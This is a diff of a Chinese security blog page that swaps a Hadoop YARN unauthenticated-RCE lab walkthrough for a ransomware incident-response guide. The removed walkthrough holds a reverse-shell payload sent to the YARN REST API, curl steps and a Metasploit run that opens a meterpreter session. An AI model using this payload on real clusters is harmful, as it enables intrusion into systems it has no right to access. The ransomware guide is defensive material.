@@ -2,9 +2,9 @@
 <html>
 <head>
   <meta charset="utf-8">
-  <title>Hadoop | Mr.Framework</title>
-  <meta name="keywords" content=" aa ">
-  <meta name="description" content="Hadoop | Mr.Framework">
+  <title>应急响应-勒索病毒篇 | Mr.Framework</title>
+  <meta name="keywords" content="">
+  <meta name="description" content="应急响应-勒索病毒篇 | Mr.Framework">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 <meta name="description" content="404 Not Found: 该页面无法显示很抱歉，您所访问的地址并不存在">
 <meta property="og:type" content="website">
@@ -579,9 +579,9 @@
 </aside>
 <div id="post">
     <div class="pjax">
-        <article id="post-Hadoop" class="article article-type-post" itemscope itemprop="blogPost">
+        <article id="post-应急响应-勒索病毒篇" class="article article-type-post" itemscope itemprop="blogPost">
     
-        <h1 class="article-title">Hadoop</h1>
+        <h1 class="article-title">应急响应-勒索病毒篇</h1>
     
     <div class="article-meta">
         
@@ -591,29 +591,20 @@
             <i class="iconfont icon-category"></i>
             
             
-            <a  data-rel="Kali">Kali</a> > 
-            
-            <a  data-rel="Kali&lt;---&gt;Exploit">Exploit</a>
+            <a  data-rel="Response">Response</a>
             
         </span>
         
         
-        <span class="tag">
-            <i class="iconfont icon-tag"></i>
-            
-            <a class="color3">aa</a>
-            
-        </span>
+    </div>
+    <div class="article-meta">
+        
+            Created At : <time class="date" title='Updated At: 2020-12-13 23:20:20'>2020-12-13 23:20</time>
         
     </div>
     <div class="article-meta">
         
-            Created At : <time class="date" title='Updated At: 2020-12-04 20:23:31'>2020-12-04 20:23</time>
-        
-    </div>
-    <div class="article-meta">
-        
-        <span>Count:878</span>
+        <span>Count:2.4k</span>
         
         
         <span id="busuanzi_container_page_pv">
@@ -643,7 +634,7 @@
     
     <div class="toc-ref">
     
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-text">信息收集</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Hadoop-Yarn%EF%BC%88ResourceManager-REST-API-%E6%9C%AA%E6%8E%88%E6%9D%83%E6%BC%8F%E6%B4%9E"><span class="toc-text">Hadoop Yarn（ResourceManager REST API)未授权漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%89%8B%E5%B7%A5%E6%88%96BP%E6%B5%8B%E8%AF%95"><span class="toc-text">手工或BP测试</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#MSF%E6%B5%8B%E8%AF%95"><span class="toc-text">MSF测试</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%AE%E5%A4%8D%E5%BB%BA%E8%AE%AE%EF%BC%9A"><span class="toc-text">修复建议：</span></a></li></ol></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B8%B8%E7%94%A8%E5%B7%A5%E5%85%B7"><span class="toc-text">常用工具</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%9D%E6%AD%A5%E9%A2%84%E5%88%A4"><span class="toc-text">初步预判</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BA%8B%E4%BB%B6%E8%83%8C%E6%99%AF"><span class="toc-text">事件背景</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%AD%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92%E7%9A%84%E7%89%B9%E5%BE%81%EF%BC%9A"><span class="toc-text">中勒索病毒的特征：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BA%86%E8%A7%A3%E4%BB%A5%E4%B8%8B%E7%B3%BB%E7%BB%9F%E6%9E%B6%E6%9E%84"><span class="toc-text">了解以下系统架构</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AF%B9%E6%84%9F%E6%9F%93%E4%B8%BB%E6%9C%BA%E5%88%86%E6%9E%90%E7%9A%84%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-text">对感染主机分析的信息收集</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%B4%E6%97%B6%E5%A4%84%E7%BD%AE"><span class="toc-text">临时处置</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%B3%BB%E7%BB%9F%E6%8E%92%E6%9F%A5"><span class="toc-text">系统排查</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E6%8E%92%E6%9F%A5"><span class="toc-text">文件排查</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Windows%E6%96%87%E4%BB%B6"><span class="toc-text">Windows文件</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Linux%E6%96%87%E4%BB%B6"><span class="toc-text">Linux文件</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Windows%E8%A1%A5%E4%B8%81%E6%8E%92%E6%9F%A5"><span class="toc-text">Windows补丁排查</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%B4%A6%E6%88%B7%E6%8E%92%E6%9F%A5"><span class="toc-text">账户排查</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BD%91%E7%BB%9C%E8%BF%9E%E6%8E%A5%E3%80%81%E8%BF%9B%E7%A8%8B%E3%80%81%E4%BB%BB%E5%8A%A1%E8%AE%A1%E5%88%92%E6%8E%92%E6%9F%A5"><span class="toc-text">网络连接、进程、任务计划排查</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Windows"><span class="toc-text">Windows</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Linux"><span class="toc-text">Linux</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%97%A5%E5%BF%97%E6%8E%92%E6%9F%A5"><span class="toc-text">日志排查</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Windows%E6%97%A5%E5%BF%97%E6%8E%92%E6%9F%A5"><span class="toc-text">Windows日志排查</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Linux%E6%97%A5%E5%BF%97%E6%8E%92%E6%9F%A5"><span class="toc-text">Linux日志排查</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BD%91%E7%BB%9C%E6%B5%81%E9%87%8F%E6%8E%92%E6%9F%A5"><span class="toc-text">网络流量排查</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%80%BB%E4%BD%93%E7%BB%93%E8%AE%BA"><span class="toc-text">总体结论</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8B%E4%BB%B6%E6%8A%91%E5%88%B6"><span class="toc-text">事件抑制</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B8%85%E9%99%A4%E5%8A%A0%E5%9B%BA"><span class="toc-text">清除加固</span></a></li></ol>
     
 <style>
     .left-col .switch-btn,
@@ -659,114 +650,219 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p>Hadoop是一个Apache基金会所开发的分布式基础架构， 核心设计是<code>HDFS</code>（即分布式文件系统）和<code>MapReduce</code>， * HDFS 为海量数据提供存储 * MapReduce为海量数据提供计算</p>
-<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><pre><code class="zsh">sudo nmap -sV -Pn -T4 -sSU -p 8088 -sC    192.168.79.207
-
-Starting Nmap 7.91 ( https://nmap.org ) at 2020-12-04 18:32 CST
-Nmap scan report for 192.168.79.207
-Host is up (0.00012s latency).
-
-PORT     STATE  SERVICE    VERSION
-8088/tcp open   http       Jetty 6.1.26
-|_http-server-header: Jetty(6.1.26)
-| http-title:     All Applications
-|_Requested resource was http://192.168.79.207:8088/cluster
-8088/udp closed radan-http
-
-Nmap done: 1 IP address (1 host up) scanned in 6.81 seconds</code></pre>
-<h2 id="Hadoop-Yarn（ResourceManager-REST-API-未授权漏洞"><a href="#Hadoop-Yarn（ResourceManager-REST-API-未授权漏洞" class="headerlink" title="Hadoop Yarn（ResourceManager REST API)未授权漏洞"></a>Hadoop Yarn（ResourceManager REST API)未授权漏洞</h2><p>YARN提供有默认开放在8088和8090的REST API（默认前者）允许用户直接通过API进行相关的应用创建、任务提交执行等操作，如果配置不当， 攻击者利用Hadoop Yarn资源管理系统REST API未授权漏洞对服务器进行远程执行代码。</p>
-<h3 id="手工或BP测试"><a href="#手工或BP测试" class="headerlink" title="手工或BP测试"></a>手工或BP测试</h3><p>Payload</p>
-<pre><code>POST /ws/v1/cluster/apps HTTP/1.1
-Host: 127.0.0.1:8088
-Upgrade-Insecure-Requests: 1
-User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.89 Safari/537.36
-Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
-Content-Type: application/json
-Content-Length: 268
-
-&#123;
-   &quot;application-id&quot;:&quot;application_1604979684298_0006&quot;,
-    &quot;application-name&quot;:&quot;test&quot;,
-    &quot;application-type&quot;:&quot;YARN&quot;,
-    &quot;am-container-spec&quot;:&#123;
-        &quot;commands&quot;:&#123;
-            &quot;command&quot;:&quot;/bin/bash -i &gt;&amp; /dev/tcp/192.168.79.28/9999  0&gt;&amp;1&quot;
-
-        &#125;
-    &#125;
-
-&#125;</code></pre>
-<p><img src="../images/fbb0c4f2882a406db268c1c917144d4c.png" alt="fbb0c4f2882a406db268c1c917144d4c"></p>
-<ol>
-<li> 申请新的application，记录<code>application-id</code>字段 直接通过curl进行POST请求</li>
-</ol>
-<pre><code>curl -v -X POST &#39;http://ip:8088/ws/v1/cluster/apps/new-application&#39;
-返回包含如下信息
-&#123;&quot;application-id&quot;:&quot;application_1527144634877_20465&quot;,&quot;maximum-resource-capability&quot;:&#123;&quot;memory&quot;:16384,&quot;vCores&quot;:8&#125;&#125;</code></pre>
-<ol start="2">
-<li> 使用nc监听9999端口 <code>nc -lvvp 9999</code></li>
-<li> 直接发送构造好的payload</li>
-</ol>
-<pre><code>curl -s -i -X POST -H &#39;Accept: application/json&#39; -H &#39;Content-Type: application/json&#39; http://ip:8088/ws/v1/cluster/apps --data-binary @1.json</code></pre>
-<p>1.json文件中的内容</p>
-<pre><code class="text">&#123;
-    &quot;am-container-spec&quot;:&#123;
-        &quot;commands&quot;:&#123;
-            &quot;command&quot;:&quot;/bin/bash -i &gt;&amp; /dev/tcp/192.168.79.28/9999  0&gt;&amp;1&quot;
-
-        &#125;
-    &#125;,
-    &quot;application-id&quot;:&quot;application_1527144634877_20465&quot;,
-    &quot;application-name&quot;:&quot;test&quot;,
-    &quot;application-type&quot;:&quot;YARN&quot;
-&#125;</code></pre>
-<h3 id="MSF测试"><a href="#MSF测试" class="headerlink" title="MSF测试"></a>MSF测试</h3><pre><code>msf6 exploit(linux/http/hadoop_unauth_exec) &gt; show options
-
-Module options (exploit/linux/http/hadoop_unauth_exec):
-
-   Name     Current Setting  Required  Description
-   ----     ---------------  --------  -----------
-   Proxies                   no        A proxy chain of format type:host:port[,type:host:port][...]
-   RHOSTS   127.0.0.1        yes       The target host(s), range CIDR identifier, or hosts file with syntax &#39;file:&lt;path&gt;&#39;
-   RPORT    8088             yes       The target port (TCP)
-   SRVHOST  0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.
-   SRVPORT  8080             yes       The local port to listen on.
-   SSL      false            no        Negotiate SSL/TLS for outgoing connections
-   SSLCert                   no        Path to a custom SSL certificate (default is randomly generated)
-   URIPATH                   no        The URI to use for this exploit (default is random)
-   VHOST                     no        HTTP server virtual host
-
-
-Payload options (linux/x64/meterpreter/reverse_tcp):
-
-   Name   Current Setting  Required  Description
-   ----   ---------------  --------  -----------
-   LHOST  192.168.79.28    yes       The listen address (an interface may be specified)
-   LPORT  4444             yes       The listen port
-
-
-Exploit target:
-
-   Id  Name
-   --  ----
-   0   Automatic
-
-
-msf6 exploit(linux/http/hadoop_unauth_exec) &gt; run
-
-[*] Started reverse TCP handler on 192.168.79.28:4444
-[*] Sending Command
-[*] Command Stager progress - 100.00% done (823/823 bytes)
-[*] Sending stage (3008420 bytes) to 192.168.79.28
-[*] Meterpreter session 2 opened (192.168.79.28:4444 -&gt; 192.168.79.28:63414) at 2020-11-10 15:44:07 +0800
-
-meterpreter &gt;</code></pre>
-<h3 id="修复建议："><a href="#修复建议：" class="headerlink" title="修复建议："></a>修复建议：</h3><ul>
-<li>如无必要，关闭Hadoop Web管理页面；</li>
-<li>开启服务级别身份验证，如Kerberos认证；</li>
-<li>部署Knox、Nginx之类的反向代理系统，防止未经授权用户访问；</li>
-<li>限制可信任的IP地址才能访问Hadoop默认开放的多个端口</li>
+        <p>编写进度</p>
+<ul>
+<li><input checked="" disabled="" type="checkbox"> </li>
 </ul>
+<p><strong>勒索病毒(Rasomware)</strong> 是伴随数字货币星期的一种新型病毒木马，<br>机器一旦遭受勒索病毒攻击，将会使绝大多数文件被非对称加密算法和对称加密算法组合的方式进行篡改，并添加一个特殊后缀。<br>绝大大叔勒索病毒均无法通过技术手段解密，必须拿到对应的解密私钥才有可能无损还原加密文件。<br>常见的勒索病毒有WannaCry、GlobeImposter、Dharma等</p>
+<p>Linux勒索病毒样本 <a target="_blank" rel="noopener" href="https://github.com/tarcisio-marinho/GonnaCry">GonnaCry</a></p>
+<h2 id="常用工具"><a href="#常用工具" class="headerlink" title="常用工具"></a>常用工具</h2><blockquote>
+<p>勒索病毒搜索引擎</p>
+</blockquote>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://lesuobingdu.qianxin.com/">奇安信勒索病毒搜索引擎</a></li>
+<li><a target="_blank" rel="noopener" href="https://lesuo.venuseye.com.cn/">启明VenuEeye勒索病毒搜索引擎</a></li>
+<li><a target="_blank" rel="noopener" href="https://lesuobingdu.360.cn/">360勒索病毒搜索引擎</a></li>
+<li><a target="_blank" rel="noopener" href="https://guanjia.qq.com/pr/ls/">腾讯勒索病毒搜索引擎</a></li>
+<li><a target="_blank" rel="noopener" href="https://edr.sangfor.com.cn/#/information/ransom_search">深信服勒索病毒搜索引擎</a></li>
+</ul>
+<blockquote>
+<p>勒索病毒解密工具</p>
+</blockquote>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://www.nomoreransom.org/zh/index.html">nomoreransom勒索软件解密工具集</a></li>
+<li><a target="_blank" rel="noopener" href="https://id-ransomware.malwarehunterteam.com/">MalwareHunterTeam勒索软件解密工具集</a></li>
+<li><a target="_blank" rel="noopener" href="https://github.com/jiansiting/Decryption-Tools">Github解密工具汇总</a></li>
+<li><a target="_blank" rel="noopener" href="https://habo.qq.com/tool/index">腾讯哈勃勒索软件专杀工具</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.trendmicro.com/zh_hk/forHome/products/free-tools.html">趋势科技勒索病毒解密工具</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.duba.net/dbt/wannacry.html">金山毒霸勒索病毒免疫工具</a></li>
+<li><a target="_blank" rel="noopener" href="https://bbs.huorong.cn/forum-55-1.html">火绒安全工具下载</a></li>
+<li><a target="_blank" rel="noopener" href="http://it.rising.com.cn/fanglesuo/index.html">瑞星解密工具下载</a></li>
+<li><a target="_blank" rel="noopener" href="https://noransom.kaspersky.com/">卡巴斯基免费勒索解密器</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.avast.com/zh-cn/ransomware-decryption-tools">Avast免费勒索软件解密工具</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.emsisoft.com/ransomware-decryption-tools/free-download">Emsisoft免费勒索软件解密工具</a></li>
+</ul>
+<h2 id="初步预判"><a href="#初步预判" class="headerlink" title="初步预判"></a>初步预判</h2><h3 id="事件背景"><a href="#事件背景" class="headerlink" title="事件背景"></a>事件背景</h3><p>xxxx年x月x日，x公司内网服务器遭遇勒索病毒。<br>应急响应工程师在抵达现场后，对包含服务器在的x台机器进行系统排查和日志分析。<br>确定内网多台服务器均感染xx勒索病毒，该公司多区，多台服务器重要数据均被加密。  </p>
+<h3 id="中勒索病毒的特征："><a href="#中勒索病毒的特征：" class="headerlink" title="中勒索病毒的特征："></a>中勒索病毒的特征：</h3><ul>
+<li>业务系统无法访问(50%)</li>
+<li>桌面新txt文件(60%)</li>
+<li>文件后缀被篡改(80%)</li>
+<li>勒索信展示(100%)</li>
+</ul>
+<h3 id="了解以下系统架构"><a href="#了解以下系统架构" class="headerlink" title="了解以下系统架构"></a>了解以下系统架构</h3><ul>
+<li>网络拓扑、业务架构、服务器类型等信息</li>
+</ul>
+<h3 id="对感染主机分析的信息收集"><a href="#对感染主机分析的信息收集" class="headerlink" title="对感染主机分析的信息收集"></a>对感染主机分析的信息收集</h3><ul>
+<li>系统名称、节点、主机名</li>
+<li>物理机/虚拟机</li>
+<li>操作系统及版本</li>
+<li>IP地址、开放端口</li>
+<li>中间件及版本</li>
+<li>数据库类型</li>
+<li>Web框架等</li>
+</ul>
+<h2 id="临时处置"><a href="#临时处置" class="headerlink" title="临时处置"></a>临时处置</h2><ol>
+<li><blockquote>
+<p>针对已感染服务器</p>
+</blockquote>
+<ol>
+<li>物理隔离</li>
+<li>加强ACL策略、修改登陆密码</li>
+</ol>
+</li>
+<li><blockquote>
+<p>针对未感染服务器</p>
+</blockquote>
+<ol>
+<li>关闭高危端口</li>
+<li>开启Windows防火墙</li>
+<li>安装杀毒软件，更新病毒库</li>
+<li>升级系统补丁</li>
+</ol>
+</li>
+<li><blockquote>
+<p>针对未知感染情况主机</p>
+</blockquote>
+<ol>
+<li>策略/断网隔离进行排查</li>
+</ol>
+</li>
+</ol>
+<h2 id="系统排查"><a href="#系统排查" class="headerlink" title="系统排查"></a>系统排查</h2><pre><code>重点关注网络连接、进程、任务计划等信息，针对windows还需关注启动项和注册表</code></pre>
+<p>若涉及溯源和证据固定，可提前对可疑对象做好备份，对涉及的可疑系统用户组可先进行禁用操作，防止出现可疑内容删除而无法溯源和提供证据的发生。</p>
+<h3 id="文件排查"><a href="#文件排查" class="headerlink" title="文件排查"></a>文件排查</h3><p>排查根据：</p>
+<blockquote>
+<p>查找距离文件加密事件1-3天创建和修改的文件<br>查找可疑时间点创建和修改的文件</p>
+</blockquote>
+<h4 id="Windows文件"><a href="#Windows文件" class="headerlink" title="Windows文件"></a>Windows文件</h4><blockquote>
+<p>根据勒索病毒加密时间对文件夹内文件列表时间进行排序</p>
+</blockquote>
+<ol>
+<li>可疑目录：</li>
+</ol>
+<ul>
+<li><code>C:\Windows\Temp\</code></li>
+<li><code>C:\Users\&lt;user&gt;\AppData\Local\Temp\</code></li>
+<li><code>C:\Users\&lt;user&gt;\Desktop\</code></li>
+<li><code>C:\Users\&lt;user&gt;\Downloads\</code></li>
+<li><code>C:\Users\&lt;user&gt;\Pictures\</code></li>
+</ul>
+<ol start="2">
+<li>可疑文件名称：</li>
+</ol>
+<ul>
+<li>svchost.exe</li>
+<li>WindowsUpdate.exe</li>
+<li>Ares.exe</li>
+<li>Snake.exe</li>
+<li>其他异常名</li>
+</ul>
+<h4 id="Linux文件"><a href="#Linux文件" class="headerlink" title="Linux文件"></a>Linux文件</h4><ul>
+<li>通过<code>stat</code>命令查看相关时间，若修改时间与文件加密日期接近</li>
+<li>通过<code>find . *.txt -perm 777</code>查看权限为777的文件</li>
+<li>通过<code>ls -ar | grep &quot;^\.&quot;</code>查看当前目录下的隐藏文件</li>
+</ul>
+<h3 id="Windows补丁排查"><a href="#Windows补丁排查" class="headerlink" title="Windows补丁排查"></a>Windows补丁排查</h3><p>通过<code>systeminfo</code>排查MS17-010漏洞补丁</p>
+<p>操作系统对应MS17-010的补丁号<br>|系统|补丁号|<br>|:—:|:—:|<br>|WinXP|KB4012598|<br>|Win2003|KB4012598|<br>|Win2008R2|KB4012212、KB4012215|<br>|Win7|KB4012212、KB4012215|</p>
+<h3 id="账户排查"><a href="#账户排查" class="headerlink" title="账户排查"></a>账户排查</h3><p><img src="../images/d0ebb9ab52e44ae3b969a9efd5fa2ddd.png" alt="15bfba5c6d457138ab2ef0fcfae4cc66.png"></p>
+<pre><code class="zsh">cat /etc/passwd | grep -E &quot;/bin/bash$&quot;  # 查看能够登陆系统的账户</code></pre>
+<h3 id="网络连接、进程、任务计划排查"><a href="#网络连接、进程、任务计划排查" class="headerlink" title="网络连接、进程、任务计划排查"></a>网络连接、进程、任务计划排查</h3><h4 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h4><pre><code>使用工具**PCHunter**进行查看</code></pre>
+<ol>
+<li>网络连接<code>netstat -ano</code><br>重点关注是否暴露135、445、3389等高危端口</li>
+<li>可疑进程<code>tasklist</code><br>重点关注随机命名的进程，可通过威胁平台判定是否为恶意进程</li>
+<li>任务计划<br><img src="../images/a7b31da5c57a405baccce9493a73dffe.png" alt="a5144c09f0eff8ecd6f6245cca31e94c.png"></li>
+<li>CPU、内存、网络使用率<code>taskmgr</code><br>重点关注CPU、内存占用过高，网络使用率过高的进程</li>
+<li>查看注册表<code>Autoruns</code><br>重点查找开机启动项中的可疑启动项</li>
+</ol>
+<h4 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h4><ol>
+<li>网络连接、进程</li>
+</ol>
+<pre><code class="zsh">netstat -antlpu  # 查看可以进程&lt;PID&gt;
+ps -ef | grep &lt;PID&gt; # 查看&lt;PID&gt;详细信息
+systemctl status &lt;PID&gt; # 查看&lt;PID&gt;详细信息</code></pre>
+<ol start="2">
+<li>CPU、内存占用情况</li>
+</ol>
+<pre><code class="zsh">top #查看CPU占用情况
+free / cat /proc/meminfo   # 查看内存占用情况
+
+3. 系统和用户的任务计划
+
+```zsh
+cat /etc/crontab   # 查看系统的任务计划
+crontab -u root -l  # 查看用户的任务计划</code></pre>
+<ol start="4">
+<li>历史执行命令 <code>cat /root/.bash_history</code></li>
+</ol>
+<p>如果不存在则说明历史文件已被删除</p>
+<h3 id="日志排查"><a href="#日志排查" class="headerlink" title="日志排查"></a>日志排查</h3><h4 id="Windows日志排查"><a href="#Windows日志排查" class="headerlink" title="Windows日志排查"></a>Windows日志排查</h4><ul>
+<li>系统日志<br>在勒索病毒事件处理中，主要查看创建任务计划、安装服务、关机、重启这样的异常操作。</li>
+<li>安全日志<br>主要检查登陆失败和登陆成功的日志，查看是否有异常的登陆行为，如暴力破解</li>
+</ul>
+<h4 id="Linux日志排查"><a href="#Linux日志排查" class="headerlink" title="Linux日志排查"></a>Linux日志排查</h4><ul>
+<li>查看所有用户最后的登陆信息 <code>lastlog</code></li>
+<li>查看用户登陆失败信息 <code>lastb</code></li>
+<li>查看用户最近登陆信息 <code>last</code></li>
+</ul>
+<h3 id="网络流量排查"><a href="#网络流量排查" class="headerlink" title="网络流量排查"></a>网络流量排查</h3><ol>
+<li>分析内网是否存在针对445端口的扫描和MS17-010漏洞的利用</li>
+<li>分析溯源勒索终端被入侵的过程</li>
+<li>分析邮件附件MD5值匹配威胁情报的数据，判定是否为勒索病毒</li>
+<li>分析网络中传播的文件是否被二次打包，进行植入式攻击</li>
+<li>分析在正常网页中植入密码，让访问者在浏览网页时利用IE浏览器或Flash等软件漏洞实施攻击的情况</li>
+</ol>
+<h3 id="总体结论"><a href="#总体结论" class="headerlink" title="总体结论"></a>总体结论</h3><p>IP地址为x.x.x.x的主机最先远程登录到IP地址x.x.x.x的主机，先进行一系列扫描及内部RDP暴力破解等操作，并通过x.x.x.x的主机进行横向移动，寻找有价值的服务器进行人工投毒，植入类似病毒进行攻击。</p>
+<h2 id="事件抑制"><a href="#事件抑制" class="headerlink" title="事件抑制"></a>事件抑制</h2><ol>
+<li>隔离问题主机，断开网络连接</li>
+<li>将135、139、445端口关闭，封堵非业务端口</li>
+<li>安装系统补丁，特别是MS17-010</li>
+<li>将服务器登陆密码全部更换复杂度更高的密码</li>
+</ol>
+<h2 id="清除加固"><a href="#清除加固" class="headerlink" title="清除加固"></a>清除加固</h2><pre><code>确认勒索病毒事件后，需及时对勒索病毒进行清理并进行相应的数据恢复工作，同时对服务器/主机进行安全加固，避免二次感染。</code></pre>
+<ol>
+<li><p>病毒清理及加固</p>
+<ol>
+<li>在网络边界防洪墙上全局关闭3389端口，或3389端口只对特定IP地址开放</li>
+<li>开启Windows防火墙，尽量关闭135、139、445、3389等不用的高危端口</li>
+<li>每台机器设置唯一登陆密码，且应设置高强度的密码，位数在15位以上，包含大小写字母，数字，特殊字符。</li>
+<li>安装最新杀毒软件，对被感染机器进行安全扫描和病毒查杀</li>
+<li>对系统进行补丁更新，封堵病毒传播路径</li>
+<li>结合备份的网站日志对网站应用进行全面代码审计，找出攻击者利用的漏洞入口，进行封堵</li>
+<li>使用全流量设备对全网中存在的威胁进行分析，排查问题</li>
+</ol>
+</li>
+<li><p>感染文件恢复</p>
+<ol>
+<li>通过解密工具进行文件恢复</li>
+<li>支付赎金进行文件恢复</li>
+</ol>
+</li>
+<li><p>后续防护工作</p>
+<ol>
+<li>服务器、终端防护<ol>
+<li>所有服务器、终端应强行实施复杂密码策略，杜绝弱口令</li>
+<li>杜绝使用通用密码管理所有机器</li>
+<li>安装杀毒软件、终端安全管理软件，并及时更新病毒库</li>
+<li>及时安装漏洞补丁</li>
+<li>服务器开启关键日志收集功能，为安全事件的溯源提供支持</li>
+</ol>
+</li>
+<li>网络防护与安全监测<ol>
+<li>对内网的安全域进行合理划分，各个安全域之间严格限制访问控制列表(ACL),限制横向移动的范围</li>
+<li>重要业务系统及核心数据库应设置独立的安全区域，并做好区域边界的安全防御工作，严格限制重要区域的访问权限，并关闭Telnet、SNMP等不必要、不安全的服务</li>
+<li>在网络内架设IDS/IPS设备，及时发现、阻断内网的横向移动行为</li>
+<li>在网络内架设全流量记录设备，以发现内网的横向移动行为，并为溯源提供支持</li>
+</ol>
+</li>
+<li>应用系统防护及数据备份<ol>
+<li>需要对应用系统进行安全渗透测试与加固，保障应用系统自身安全可控</li>
+<li>对业务系统及数据进行及时备份，并定期验证备份系统及备份数据的可用性</li>
+<li>建立安全灾备预案，一旦核心系统遭受攻击，需要确保备份业务系统可以立即启用，同时做好备份系统与主系统的安全隔离工作，避免主、备系统同时被攻击，影响业务连续性</li>
+</ol>
+</li>
+</ol>
+</li>
+</ol>
 <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">
       
        <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。可以在下面评论区评论，也可以邮件至 askding@qq.com </span>
